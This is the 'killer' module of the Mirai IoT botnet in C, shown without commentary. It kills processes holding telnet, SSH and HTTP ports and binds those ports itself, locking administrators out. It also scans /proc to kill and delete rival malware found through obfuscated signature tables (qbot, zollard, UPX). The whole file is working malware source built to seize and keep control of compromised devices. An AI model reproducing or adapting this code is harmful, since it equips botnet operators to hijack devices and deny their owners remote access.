#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;


    if (killer_kill_by_port(htons(23)))
    {
    } else {
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }

    if (killer_kill_by_port(htons(22)))
    {
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }

    if (killer_kill_by_port(htons(80)))
    {
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;

                table_unlock_val(TABLE_KILLER_ANIME);
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            } 

            
			
            /*if (upx_scan_match(exe_path, status_path))
            {
                kill(pid, 9);
            }*/
            

            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];


    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }


    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);

                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}


/*static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;

    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }

    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    close(fd);
    return FALSE;
}*/



static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard, *m_devnull, *m_cookie, *m_assword, *m_ogin, *m_enter, *m_watchdog, *m_watchdog2, *m_http, *m_netslink, *m_nvalid, *m_sername, *m_enied, *m_binsh;
    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len, m_devnull_len, m_cookie_len, m_assword_len, m_ogin_len, m_enter_len, m_watchdog_len, m_watchdog2_len, m_http_len, m_netslink_len, m_nvalid_len, m_sername_len, m_enied_len, m_binsh_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_QBOT2);
    table_unlock_val(TABLE_MEM_QBOT3);
    table_unlock_val(TABLE_MEM_UPX);
    table_unlock_val(TABLE_MEM_ZOLLARD);
    table_unlock_val(TABLE_KILLER_DEVNULL);
    table_unlock_val(TABLE_KILLER_COOKIE);
    table_unlock_val(TABLE_KILLER_ASSWORD);
    table_unlock_val(TABLE_KILLER_OGIN);
    table_unlock_val(TABLE_KILLER_ENTER);
    table_unlock_val(TABLE_KILLER_WATCHDOG);
    table_unlock_val(TABLE_KILLER_WATCHDOG2);
    table_unlock_val(TABLE_KILLER_HTTP);
    table_unlock_val(TABLE_KILLER_NETSLINK);
    table_unlock_val(TABLE_KILLER_NVALID);
    table_unlock_val(TABLE_KILLER_SERNAME);
    table_unlock_val(TABLE_KILLER_ENIED);
    table_unlock_val(TABLE_KILLER_BINSH);

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);
    m_devnull = table_retrieve_val(TABLE_KILLER_DEVNULL, &m_devnull_len);
    m_cookie = table_retrieve_val(TABLE_KILLER_COOKIE, &m_cookie_len);
    m_assword = table_retrieve_val(TABLE_KILLER_ASSWORD, &m_assword_len);
    m_ogin = table_retrieve_val(TABLE_KILLER_OGIN, &m_ogin_len);
    m_enter = table_retrieve_val(TABLE_KILLER_ENTER, &m_enter_len);
    m_watchdog = table_retrieve_val(TABLE_KILLER_WATCHDOG, &m_watchdog_len);
    m_watchdog2 = table_retrieve_val(TABLE_KILLER_WATCHDOG2, &m_watchdog2_len);
    m_http = table_retrieve_val(TABLE_KILLER_HTTP, &m_http_len);
    m_netslink = table_retrieve_val(TABLE_KILLER_NETSLINK, &m_netslink_len);
    m_nvalid = table_retrieve_val(TABLE_KILLER_NVALID, &m_nvalid_len);
    m_sername = table_retrieve_val(TABLE_KILLER_SERNAME, &m_sername_len);
    m_enied = table_retrieve_val(TABLE_KILLER_ENIED, &m_enied_len);
    m_binsh = table_retrieve_val(TABLE_KILLER_BINSH, &m_binsh_len);


    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len) ||
            mem_exists(rdbuf, ret, m_devnull, m_devnull_len) ||
            mem_exists(rdbuf, ret, m_cookie, m_cookie_len) ||
            mem_exists(rdbuf, ret, m_assword, m_assword_len) ||
            mem_exists(rdbuf, ret, m_ogin, m_ogin_len) ||
            mem_exists(rdbuf, ret, m_enter, m_enter_len) ||
            mem_exists(rdbuf, ret, m_watchdog, m_watchdog_len) ||
            mem_exists(rdbuf, ret, m_watchdog2, m_watchdog2_len) ||
            mem_exists(rdbuf, ret, m_http, m_http_len) ||
            mem_exists(rdbuf, ret, m_netslink, m_netslink_len) ||
            mem_exists(rdbuf, ret, m_nvalid, m_nvalid_len) ||
            mem_exists(rdbuf, ret, m_sername, m_sername_len) ||
            mem_exists(rdbuf, ret, m_enter, m_enter_len) ||
            mem_exists(rdbuf, ret, m_binsh, m_binsh_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);
    table_lock_val(TABLE_KILLER_DEVNULL);
    table_lock_val(TABLE_KILLER_COOKIE);
    table_lock_val(TABLE_KILLER_ASSWORD);
    table_lock_val(TABLE_KILLER_OGIN);
    table_lock_val(TABLE_KILLER_ENTER);
    table_lock_val(TABLE_KILLER_WATCHDOG);
    table_lock_val(TABLE_KILLER_WATCHDOG2);
    table_lock_val(TABLE_KILLER_HTTP);
    table_lock_val(TABLE_KILLER_NETSLINK);
    table_lock_val(TABLE_KILLER_NVALID);
    table_lock_val(TABLE_KILLER_SERNAME);
    table_lock_val(TABLE_KILLER_ENIED);
    table_lock_val(TABLE_KILLER_BINSH);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
